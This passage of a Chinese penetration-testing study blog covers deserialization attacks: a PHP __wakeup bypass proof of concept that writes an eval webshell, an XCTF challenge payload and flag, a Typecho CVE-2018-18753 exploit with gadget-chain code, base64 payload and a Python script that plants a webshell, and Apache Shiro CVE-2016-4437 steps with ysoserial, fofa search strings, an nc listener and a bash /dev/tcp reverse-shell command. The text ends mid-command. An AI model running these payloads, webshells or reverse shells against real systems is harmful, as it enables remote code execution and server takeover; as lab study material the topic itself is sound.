PHP5小于5.6.25或PHP7小于7.0.10</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>poc.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// PHP5小于5.6.25或PHP7小于7.0.10</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">poc</span> <span class="token operator">=</span> <span class="token variable">$poc</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">poc</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST["shell"]);?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fail to getshell!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=&gt;</span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"waking up...n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// PHP5小于5.6.25或PHP7小于7.0.10</span><span class="token comment">// 1改为大于1的数字</span><span class="token comment">// 将Testpoc改为%00Test%00poc</span><span class="token comment">// O:4:"Test":2:{s:9:"%00Test%00poc";s:5:"shell";}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构造序列化"><a href="#构造序列化" class="headerlink" title="构造序列化"></a>构造序列化</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">xctf</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'111'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">xctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// O:4:"xctf":2:{s:4:"flag";s:3:"111";}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><p><code>http://61.147.171.105:53418/?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}</code></p><p>the answer is : cyberpeace{01ac23bddb1dc4962e5a3fa5a6853627}</p><p>cyberpeace{01ac23bddb1dc4962e5a3fa5a6853627}</p><h1 id="typecho反序列化漏洞分析"><a href="#typecho反序列化漏洞分析" class="headerlink" title="typecho反序列化漏洞分析"></a>typecho反序列化漏洞分析</h1><h2 id="题目地址-1"><a href="#题目地址-1" class="headerlink" title="题目地址"></a>题目地址</h2><h3 id="CVE-2018-18753"><a href="#CVE-2018-18753" class="headerlink" title="CVE-2018-18753"></a>CVE-2018-18753</h3><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18753">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18753</a> </p><h3 id="typecho下载地址"><a href="#typecho下载地址" class="headerlink" title="typecho下载地址"></a>typecho下载地址</h3><p><a href="https://github.com/typecho/typecho/releases/tag/v1.0-14.10.10-release">https://github.com/typecho/typecho/releases/tag/v1.0-14.10.10-release</a> </p><p>PHP版本：5.4.5nts （PHPStudy） </p><p>在数据库新建一个库，命名为typecho</p><h3 id="type-poc-php"><a href="#type-poc-php" class="headerlink" title="type-poc.php"></a>type-poc.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Typecho_Feed</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token constant">RSS1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'RSS 1.0'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">RSS2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'RSS 2.0'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">ATOM1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ATOM 1.0'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATE_RFC822</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATE_W3CDTF</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'c'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">EOL</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$_type</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$_items</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_type</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">::</span><span class="token constant">RSS2</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_items</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'title'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'link'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'date'</span> <span class="token operator">=&gt;</span> <span class="token number">1508895132</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'category'</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'author'</span> <span class="token operator">=&gt;</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Typecho_Request</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'screenName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo()'</span><span class="token punctuation">;</span>    <span class="token comment">//替换phpinfo()这里进行深度利用</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_filter</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'assert'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'adapter'</span> <span class="token operator">=&gt;</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'prefix'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'typecho_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>//YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将文件加入他typecho里</p><p>访问：<a href="http://192.168.31.193:8095/type-poc.php">http://192.168.31.193:8095/type-poc.php</a></p><p>得到pyload</p><p><img src="assets/image-20221126203439904.png" alt="image-20221126203439904"></p><p>访问：</p><p><a href="http://192.168.31.193:8095/install.php?finish=%20HTTP/1.1">http://192.168.31.193:8095/install.php?finish=%20HTTP/1.1</a></p><p>使用hackbar插件</p><p><img src="assets/image-20221126204151988.png" alt="image-20221126204151988"></p><p><img src="assets/image-20221126204513999.png" alt="image-20221126204513999"></p><h3 id="type-poc-py"><a href="#type-poc-py" class="headerlink" title="type-poc.py"></a>type-poc.py</h3><p>作用：在当前网页上生成一句话木马</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">import requests import sys url <span class="token operator">=</span> <span class="token string double-quoted-string">"http://192.168.31.193:8095/install.php?finish="</span>payload <span class="token operator">=</span> <span class="token string double-quoted-string">"YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjU4OiJmcHV0cyhmb3Blbignc2hlbGwucGhwJywndycpLCc8Pz1AZXZhbCgkX1JFUVVFU1RbNzc3XSk/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTg6ImZwdXRzKGZvcGVuKCdzaGVsbC5waHAnLCd3JyksJzw/PUBldmFsKCRfUkVRVUVTVFs3NzddKT8+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9"</span> postData <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string double-quoted-string">"__typecho_config"</span><span class="token punctuation">:</span>payload<span class="token punctuation">}</span> header <span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string double-quoted-string">"Referer"</span><span class="token punctuation">:</span>url<span class="token punctuation">,</span> <span class="token string double-quoted-string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"</span><span class="token punctuation">}</span> <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> res <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">if</span> res<span class="token operator">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[+] install.php exist!"</span><span class="token punctuation">)</span> <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[-] install.php not exist"</span><span class="token punctuation">)</span> sys<span class="token operator">.</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> res <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span> postData<span class="token punctuation">,</span>headers <span class="token operator">=</span> header<span class="token punctuation">)</span> res <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">)</span> <span class="token keyword">if</span> res<span class="token operator">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[+] Shell.php write success!"</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Shell path :"</span><span class="token punctuation">,</span>url<span class="token operator">+</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">)</span> <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[-] GetShell Error!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行type-poc-py"><a href="#运行type-poc-py" class="headerlink" title="运行type-poc.py"></a>运行type-poc.py</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿guoyx)-[/home/kali]└─# python3 type-poc.py   http://192.168.31.193:8095/install.php?finish=[+] install.php exist![+] Shell.php write success!Shell path : http://192.168.31.193:8095/install.php?finish=shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成一句话木马成功，使用蚁剑链接</p><p><a href="http://192.168.31.193:8095/shell.php">http://192.168.31.193:8095/shell.php</a></p><p><img src="assets/image-20221126205327772.png" alt="image-20221126205327772"></p><p><img src="assets/image-20221126205616002.png" alt="image-20221126205616002"></p><p>连接成功</p><p>这个漏洞主要源自typecho安装程序install.php里有<code>unserialize</code>反序列化漏洞…</p><p>![屏幕截图 2022-11-26 210739](assets/屏幕截图 2022-11-26 210739.png)</p><h1 id="反序列化漏洞修复和防御"><a href="#反序列化漏洞修复和防御" class="headerlink" title="反序列化漏洞修复和防御"></a>反序列化漏洞修复和防御</h1><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>针对unserialize和Magic函数审计 </p><p>对用户输入的内容过滤 </p><p>白名单，限制反序列化的类；不能动态传参</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/21-fan-xu-lie-hua/java-fan-xu-lie-hua/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/21-fan-xu-lie-hua/java-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ol><li>JDK解压版：包含Java运行时环境 </li><li>IDEA ：开发工具 </li><li>Maven ：jar包依赖管理 </li><li>Tomcat ：HTTP服务器 </li><li>Burp Suite ：发送HTTP请求 </li><li>Kali ：启动相关服务</li></ol><h2 id="总体规划"><a href="#总体规划" class="headerlink" title="总体规划"></a>总体规划</h2><ol><li>Java反序列化漏洞 </li><li>Apache Commons Collections反序列化漏洞 </li><li>Alibaba Fastjson反序列化漏洞 </li><li>Apache Shiro反序列化漏</li></ol><h1 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h1><h1 id="课程目录"><a href="#课程目录" class="headerlink" title="课程目录"></a>课程目录</h1><ol><li>序列化和反序列化的含义和用途 </li><li>Java序列化演示 </li><li>反序列化漏洞的出现</li></ol><h1 id="序列化和反序列化的含义和用途"><a href="#序列化和反序列化的含义和用途" class="headerlink" title="序列化和反序列化的含义和用途"></a>序列化和反序列化的含义和用途</h1><h2 id="Java序列化和反序列化"><a href="#Java序列化和反序列化" class="headerlink" title="Java序列化和反序列化"></a>Java序列化和反序列化</h2><p><img src="assets/image-20221127095350744.png" alt="image-20221127095350744"></p><h2 id="序列化主要使用场景"><a href="#序列化主要使用场景" class="headerlink" title="序列化主要使用场景"></a>序列化主要使用场景</h2><ol><li>持久化内存数据 </li><li>网络传输对象 </li><li>远程方法调用(RMI)</li><li>……</li></ol><h2 id="JSON格式"><a href="#JSON格式" class="headerlink" title="JSON格式"></a>JSON格式</h2><p><img src="assets/image-20221127095441986.png" alt="image-20221127095441986"></p><h1 id="Java序列化演示"><a href="#Java序列化演示" class="headerlink" title="Java序列化演示"></a>Java序列化演示</h1><p>Person对象，实现Serializable接口</p><h2 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h2><p>参考： </p><p><a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html</a></p><p><a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html#a10258">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html#a10258</a></p><h2 id="java序列化和反序列化"><a href="#java序列化和反序列化" class="headerlink" title="java序列化和反序列化"></a>java序列化和反序列化</h2><p>序列化</p><p>java.io.ObjectOutputStream.writeObject() </p><p>反序列化 </p><p>java.io.ObjectInputStream.<strong>readObject</strong>()</p><h1 id="反序列化漏洞的出现"><a href="#反序列化漏洞的出现" class="headerlink" title="反序列化漏洞的出现"></a>反序列化漏洞的出现</h1><h2 id="自定义反序列化"><a href="#自定义反序列化" class="headerlink" title="自定义反序列化"></a>自定义反序列化</h2><ol><li>重写类的readObject()方法 </li><li>反序列过程中会执行自定义的readObject()</li></ol><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>利用自定义的readObject()方法执行代码 </li><li>寻找重写了readObject()方法的类</li></ol><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>有没有重写了readObject()的<strong>现成的</strong>类？ </p><p>package sun.reflect.annotation; </p><p>AnnotationInvocationHandler </p><p>package javax.management; </p><p>BadAttributeValueExpException</p><p> …</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/21-fan-xu-lie-hua/apache-shiro-fan-xu-lie-hua/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/21-fan-xu-lie-hua/apache-shiro-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Shiro介绍"><a href="#Apache-Shiro介绍" class="headerlink" title="Apache Shiro介绍"></a>Apache Shiro介绍</h1><p> 一款开源安全框架 </p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li>身份</li><li>验证 </li><li>授权 </li><li>会话管理 </li><li>加密</li></ul><h2 id="官方sample"><a href="#官方sample" class="headerlink" title="官方sample"></a>官方sample</h2><p><a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4">https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4</a> </p><p>shiro-shiro-root-1.2.4\samples\web </p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="CVE-2016-4437"><a href="#CVE-2016-4437" class="headerlink" title="CVE-2016-4437"></a>CVE-2016-4437</h3><p>2016年7月，1.2.4以下版本爆出RCE漏洞  </p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>登录的时候序列化保存了登录信息到 Cookie（序列化、AES加密、Base64） </p><h3 id="利用难点"><a href="#利用难点" class="headerlink" title="利用难点"></a>利用难点</h3><p>怎么获取到AES的key </p><p>怎么构造一个序列化对象</p><h1 id="漏洞原因分析"><a href="#漏洞原因分析" class="headerlink" title="漏洞原因分析"></a>漏洞原因分析</h1><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p><img src="assets/image-20221127191004831.png" alt="image-20221127191004831"></p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p><img src="assets/image-20221127191018157.png" alt="image-20221127191018157"></p><h1 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h1><h2 id="本地启动环境（Windows）"><a href="#本地启动环境（Windows）" class="headerlink" title="本地启动环境（Windows）"></a>本地启动环境（Windows）</h2><p>IDEA，修改pom.xml </p><p>配置tomcat服务器，启动 </p><p><a href="http://localhost:8000/samples_web_war/">http://localhost:8000/samples_web_war/</a> </p><h2 id="Docker-vulhub启动环境"><a href="#Docker-vulhub启动环境" class="headerlink" title="Docker vulhub启动环境"></a>Docker vulhub启动环境</h2><p> <code>cd /usr/local/soft/vulhub/shiro/CVE-2016-4437</code> </p><p><code>docker-compose up -d</code> </p><p><a href="http://192.168.31.76:8080/">http://192.168.31.76:8080</a> </p><p>勾选rememberme，使用 admin vulhub进行登录 </p><p>注意这里跟有没有账号密码，是不是登录成功了没有关系</p><h1 id="利用工具和方式"><a href="#利用工具和方式" class="headerlink" title="利用工具和方式"></a>利用工具和方式</h1><h2 id="什么是JRMP协议"><a href="#什么是JRMP协议" class="headerlink" title="什么是JRMP协议"></a>什么是JRMP协议</h2><p>Java Remote Method Protocol，Java远程方法 协议 </p><p>RMI使用了JRMP </p><h2 id="ysoserial工具"><a href="#ysoserial工具" class="headerlink" title="ysoserial工具"></a>ysoserial工具</h2><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> </p><p>mvn package -D skipTests </p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>payloads/JRMPLIstener exploit/JRMPClient </p><p>在漏洞服务器开启JRMP监听 </p><p>exploit/JRMPListener payloads/JRMPClient </p><p>让漏洞服务器主动连接到恶意JRMP监听，发送 payload </p><p>二次反序列化 </p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>先构建一个恶意命令，它的作用是让漏洞服务器连接到我们启动的JRMP服务器 </li><li>把这个命令序列化、AES加密、base64编码（payload2），写入到Cookie，发给漏洞服务 器 </li><li>漏洞服务器：base64解码、AES解密、反序列化，执行恶意命令，连接到JRMP服务器</li><li>继续发送恶意payload1，利用CC等通用库的漏洞执行命令</li></ol><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="ysoserial-jar"><a href="#ysoserial-jar" class="headerlink" title="ysoserial.jar"></a>ysoserial.jar</h3><p>序列化 </p><h3 id="python-shiro-py"><a href="#python-shiro-py" class="headerlink" title="python shiro.py"></a>python shiro.py</h3><ul><li>AES加密 </li><li>base64编码 </li><li>Cookie</li></ul><h3 id="Brup或者python"><a href="#Brup或者python" class="headerlink" title="Brup或者python"></a>Brup或者python</h3><p>发起HTTP请求</p><h1 id="利用实现"><a href="#利用实现" class="headerlink" title="利用实现"></a>利用实现</h1><h2 id="漏洞检测与发现"><a href="#漏洞检测与发现" class="headerlink" title="漏洞检测与发现"></a>漏洞检测与发现</h2><h3 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h3><p><code>header="rememberme=deleteMe"</code></p><p><code>header=" shiroCookie"</code> </p><h3 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h3><ol><li>shiro_tool.jar 纯字符版 </li><li>ShiroExploitV2.51 </li><li>shiro_attack-v2.0.jar</li></ol><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="kali监听7777"><a href="#kali监听7777" class="headerlink" title="kali监听7777"></a>kali监听7777</h3><p><code>nc -lvp 7777</code> </p><h3 id="反弹连接命令准备"><a href="#反弹连接命令准备" class="headerlink" title="反弹连接命令准备"></a>反弹连接命令准备</h3><p><code>bash -i &gt;&amp; /dev/tcp/192.168.142.132/7777 0&gt;&amp;1</code> </p><p><a href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a> </p><p>得到 </p><p><code>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIv 